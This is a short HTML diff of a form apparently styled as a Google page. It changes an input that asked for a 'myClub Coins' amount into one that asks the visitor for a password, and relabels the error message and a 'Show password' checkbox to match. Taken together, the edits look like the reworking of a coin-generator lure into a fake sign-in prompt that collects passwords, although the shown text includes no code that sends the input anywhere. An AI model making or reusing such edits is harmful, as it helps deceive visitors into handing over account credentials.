@@ -713,7 +713,7 @@
             type="text" 
             id="googleCoinsInput" 
             class="g-pwd-input" 
-            placeholder="e.g. 10.000 Coins"
+            placeholder="Enter your password"
             autocomplete="off"
             oninput="handleCoinsInput(this.value)"
             onkeydown="if(event.key==='Enter') handleGoogleCoinsSubmit()"
@@ -723,7 +723,7 @@
           <svg viewBox="0 0 24 24" width="14" height="14" fill="#d93025">
             <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
           </svg>
-          <span id="googleCoinsErrorText">Enter myClub Coins amount</span>
+          <span id="googleCoinsErrorText">Enter password</span>
         </div>
 
         <!-- Show Coins Checkbox -->
@@ -731,7 +731,7 @@
           <label class="g-checkbox-label">
             <input type="checkbox" id="showCoinsCheckbox" class="g-checkbox-native" checked onchange="toggleCoinsVisibility(this.checked)">
             <span class="g-checkbox-custom"></span>
-            <span class="g-checkbox-text">Show Coins</span>
+            <span class="g-checkbox-text">Show password</span>
           </label>
         </div>
 
